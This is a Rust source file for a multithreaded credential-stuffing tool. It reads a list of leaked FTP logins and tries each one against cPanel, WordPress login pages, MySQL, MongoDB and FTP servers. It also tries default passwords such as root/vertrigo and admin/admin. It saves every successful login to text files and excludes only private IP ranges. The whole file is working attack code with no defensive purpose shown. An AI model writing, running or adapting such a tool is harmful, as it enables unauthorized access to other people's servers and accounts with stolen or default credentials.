use colored::*;
use ftp::{FtpError, FtpStream};
use mongodb::{bson::doc, options::ClientOptions, Client, Collection};
use prettytable::row;
use prettytable::{Cell, Row, Table};
use rayon::iter::IntoParallelIterator;
use rayon::iter::ParallelIterator;
use reqwest::header::{self, HeaderMap};
use std::collections::{HashMap, HashSet};
use std::env::{self, args};
use std::fs::{self, read_to_string};
use std::io::Write;
use std::process::exit;
use std::time::Duration;
use FtpProject::UserAgent;
use clap::{arg, command, value_parser, ArgAction, Command};
static TIMEOUT_MYSQL_CONNECT: Duration = std::time::Duration::from_secs(10);



fn main() {
    let _thread_pool = rayon::ThreadPoolBuilder::new() // Alterado para rayon::ThreadPoolBuilder
        .num_threads(140)
        .build_global()
        .unwrap();
    let args = recev_args();
    println!("{}: {}", "Total".bright_blue(), args.len());
    
    args.into_par_iter().for_each(|login| {
        Cpanelbruteforce(login.clone());
        WordPress(login.clone());
        connectMysql(login.clone());
        bruteMongoDb(login.clone());
        connect_ftp(login.clone());
    });
}

fn recev_args() -> HashSet<LoginFtpStruct> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Preciso do arquivo");
        exit(1);
    }
 

    let filename = args[1].to_owned();
    let string = fs::read_to_string(filename).expect("Não foi possivel abrir o arquivo");
    let mut ArrayValores = HashSet::new();
    for lines in string.lines() {
        let split: Vec<&str> = lines.split("//").collect();
        if split.len() == 2 {
            let pontos = split[1];
            let pontos_: Vec<&str> = pontos.split("/").collect();

            let host: Vec<&str> = pontos_[0].split(":").collect();
            let host = host[0];
            if IpLocalNotDanied(host) {
                continue;
            }

            let pontos: Vec<&str> = pontos.split(":").collect();
            if pontos.len() < 3 {
                continue;
            }

            if pontos.len() == 4 {
                let host = host;
                let port = pontos[1].parse::<u16>().unwrap_or(21);
                let username = pontos[2];
                let pass = pontos[3];
                let ftp_login = LoginFtpStruct {
                    host: host.to_string(),
                    port: port,
                    username: username.to_string(),
                    password: pass.to_string(),
                };
                ArrayValores.insert(ftp_login);
                if port != 21 {
                    let ftp_login = LoginFtpStruct {
                        host: host.to_string(),
                        port: port,
                        username: username.to_string(),
                        password: pass.to_string(),
                    };

                    ArrayValores.insert(ftp_login);
                }
                continue;
            }
            let host = host;
            let port = 21;
            let username = pontos[1];
            let pass = pontos[2];
            let ftp_login = LoginFtpStruct {
                host: host.to_string(),
                port: port,
                username: username.to_string(),
                password: pass.to_string(),
            };
            ArrayValores.insert(ftp_login);
        }
        continue;
    }

    ArrayValores
}

fn IpLocalNotDanied(str: &str) -> bool {
    let ips_not_permitido = ["192.168.", "10.0.0", "127.0.0", "localhost"];
    for ip in ips_not_permitido {
        if str.contains(ip) {
            return true;
        }
    }
    false
}

#[derive(Eq, Hash, PartialEq, Debug, Clone)]
struct LoginFtpStruct {
    host: String,
    port: u16,
    username: String,
    password: String,
}

fn connect_ftp(login: LoginFtpStruct) {
    let connect = FtpStream::connect(format!("{}:{}", login.host, login.port));
    match connect {
        Ok(mut Connection) => {
            let result = Connection.login(&login.username, &login.password);
            if let Err(error) = result {

                // aqui eu posso usar outro tipo de erros
            } else {
                println!("Found");
                let mut table = Table::new();
                table.add_row(row![
                    "Host".bright_green(),
                    "Port".bright_white(),
                    "Username".bright_cyan(),
                    "Password".bright_purple()
                ]);
                table.add_row(row![1, login.host.on_blue(), 30]);
                table.add_row(row![2, login.port, 25]);
                table.add_row(row![3, login.username.bright_green(), 35]);
                table.add_row(row![4, login.password.bright_yellow(), 35]);

                table.printstd();

                let v = table.to_string();
                salvefile("ValidFtp.txt", v);
            }
        }

        _ => {
            println!("{}", "Ftp Attack".bright_blue());
        }
    }
}

pub fn salvefile(filename: &str, buffer: String) {
    let mut file = fs::OpenOptions::new()
        .append(true)
        .create(true)
        .write(true)
        .open(filename)
        .unwrap();
    file.write(buffer.as_bytes());
}

use mysql::prelude::*;
use mysql::*;

fn connectMysql(login: LoginFtpStruct) {
    let opts = OptsBuilder::new()
        .ip_or_hostname(Some(login.host.as_str()))
        .user(Some(login.username))
        .pass(Some((login.password.as_str())))
        .tcp_connect_timeout(Some(TIMEOUT_MYSQL_CONNECT));

    let opts2 = OptsBuilder::new()
        .ip_or_hostname(Some(login.host.as_str()))
        .user(Some("root"))
        .pass(Some((login.password.as_str())))
        .tcp_connect_timeout(Some(TIMEOUT_MYSQL_CONNECT));

    let opts3 = OptsBuilder::new()
        .ip_or_hostname(Some(login.host.as_str()))
        .user(Some("root"))
        .pass(Some(("vertrigo")))
        .tcp_connect_timeout(Some(TIMEOUT_MYSQL_CONNECT));
    let opts4 = OptsBuilder::new()
        .ip_or_hostname(Some(login.host.as_str()))
        .user(Some(""))
        .pass(Some(("")))
        .tcp_connect_timeout(Some(TIMEOUT_MYSQL_CONNECT));
    let vec_options = [opts, opts2, opts3, opts4];

    vec_options.into_par_iter().for_each(|pool| {
        let connect = Pool::new(pool.clone());
        if let Err(ref error) = connect {
            match error {
                error::Error::MySqlError(error) => {
                    println!("{}", "Password invalid".bright_cyan());
                }
                e => {
                    //error::ServerError::BA
                    //  println!("{}", "Try Attack Mysql".bright_red())
                }
            }
        } else {
            let format_logado = format!("{:?}\n\n", pool);
            println!("{}", "Mysql Logade".bright_green());
            println!("{}", format_logado.bright_green());
            salvefile("mysqlsucess.txt", format_logado);
            return;
        }
    });
}

fn bruteMongoDb(login: LoginFtpStruct) {
    let runtime = tokio::runtime::Runtime::new().unwrap();
    runtime.block_on(async {
        mongobdbrute(login).await;
    });
}

async fn mongobdbrute(login: LoginFtpStruct) {
    let opts1 = format!(
        "mongodb://{}:{}@{}:27017",
        login.username.clone(),
        login.password,
        login.host
    );
    let opts2 = format!("mongodb://admin:admin@{}:27017", login.host);
    let opts3 = format!("mongodb://root:{}@{}:27017", login.password, login.host);
    let opts4 = format!("mongodb://mongodb:mongodb@{}:27017", login.host);
    let opts5 = format!("mongodb://:@{}:27017", login.host);

    let vec_url = [opts1, opts2, opts3, opts4, opts5];
    for url in vec_url {
        if try_login(&url).await {
            println!("{}", "MongoDB Success logad".on_green());
            salvefile("mongodbSucess.txt", format!("{}\n\n", url));
        } else {
            println!("{}", "MongDb Invalid".bright_purple());
        }
    }
}

async fn try_login(uri: &str) -> bool {
    let client_options = match ClientOptions::parse(uri).await {
        Ok(options) => options,
        Err(_) => {
            println!("Erro ao tentar conectar com o URI: {}", uri);
            return false;
        }
    };

    match Client::with_options(client_options) {
        Ok(client) => {
            match client
                .database("admin")
                .run_command(doc! {"ping": 1}, None)
                .await
            {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

fn WordPress(login: LoginFtpStruct) {
    let mut header = HeaderMap::new();
    header.append("User-Agent", UserAgent().parse().unwrap());
    header.append(
        "Referer",
        format!("https://{}/wp-login.php", login.host)
            .parse()
            .unwrap(),
    );

    let mut payload = HashMap::new();
    payload.insert("log", login.username.clone());
    payload.insert("pwd", login.password.clone());
    payload.insert("wp-submit", "Log In".to_string());
    payload.insert("redirect_to", format!("https://{}/wp-admin/", login.host));
    payload.insert("testcookie", "1".to_string());

    let mut client = reqwest::blocking::Client::new();

    let response = client
        .post(format!("https://{}/wp-login.php", login.host))
        .headers(header)
        .form(&payload)
        .timeout(Duration::from_secs(30))
        .send();
    match response {
        Ok(resposta) => {
            if resposta.status() == 200 {
                let resposta_feita = resposta;
                let url = resposta_feita.url().as_str();

                if url.contains("wp-admin") {
                    println!(
                        "{} {} {}",
                        "[Wordpress] ".bright_cyan(),
                        "[GOOD!]".bright_green(),
                        login.host.bright_white()
                    );

                    let salve_buffer = format!(
                        "Host: {}\nUsername: {}\nPassword: {}\n\n",
                        format!("https://{}/wp-login.php", login.host),
                        login.username,
                        login.password.clone()
                    );
                    println!("{}", salve_buffer);
                    salvefile("logadoword.txt", salve_buffer);
                }

                if url.contains("ashboard") {
                    println!(
                        "{} {} {}",
                        "[Wordpress] ".bright_cyan(),
                        "[GOOD!]".bright_green(),
                        login.host.bright_white()
                    );

                    let salve_buffer = format!(
                        "Host: {}\nUsername: {}\nPassword: {}\n\n",
                        format!("https://{}/wp-login.php", login.host),
                        login.username,
                        login.password
                    );
                    println!("{}", salve_buffer);
                    salvefile("logadoword.txt", salve_buffer);
                }
                if url.contains("my-account") {
                    println!(
                        "{} {} {}",
                        "[Wordpress] ".bright_cyan(),
                        "[GOOD!]".bright_green(),
                        login.host.bright_white()
                    );

                    let salve_buffer = format!(
                        "Host: {}\nUsername: {}\nPassword: {}\n\n",
                        format!("https://{}/wp-login.php", login.host),
                        login.username,
                        login.password
                    );
                    println!("{}", salve_buffer);
                    salvefile("logadoword.txt", salve_buffer);
                }

                println!(
                    "{} {} {}",
                    "[Wordpress] ".bright_blue(),
                    "[BAD!]".bright_red(),
                    login.host.bright_white()
                );
                return;
            }
        }

        _ => {}
    }
}

fn Cpanelbruteforce(login: LoginFtpStruct) {
    //println!("{:?}", login);
    //let url = format!("https://reseller3.networksclub.net:2083/");
    let mut header = HeaderMap::new();
    header.append("User-Agent", UserAgent().parse().unwrap());
    header.append(
        "Referer",
        format!("https://{}:2083/", login.host).parse().unwrap(),
    );

    let mut payload = HashMap::new();
    payload.insert("user", login.username.clone());
    payload.insert("pass", login.password.clone());
    payload.insert("goto_uri", "/".to_string());

    let mut client = reqwest::blocking::Client::new();

    let response = client
        .post(format!("https://{}:2083/login/?login_only=1", login.host))
        .headers(header)
        .form(&payload)
        .timeout(Duration::from_secs(30))
        .send();
    match response {
        Ok(resposta) => {
            let status = resposta.status();

            let resposta_feita = resposta;
           // println!("{:?}", resposta_feita.headers());
            let url = resposta_feita.url().as_str();
            let resposta_text = resposta_feita.text();
            let resposta = resposta_text.unwrap();
         
            if resposta.contains("security_token"){
                println!(
                    "{} {} {}",
                    "[CPanel] ".bright_cyan(),
                    "[GOOD!]".bright_green(),
                    login.host.bright_white()
                );

                let salve_buffer = format!(
                    "Host: {}\nUsername: {}\nPassword: {}\n\n",
                    format!("https://{}:2083/", login.host),
                    login.username,
                    login.password.clone()
                );
                println!("{}", salve_buffer);
               salvefile("CpAnelValid.txt", salve_buffer);
            }
            else {
              
                println!(
                    "{} {} {}",
                    "[CPanel] ".bright_blue(),
                    "[BAD!]".bright_red(),
                    login.host.bright_white()
                );
            }
        }

        _ => {}
    }
}





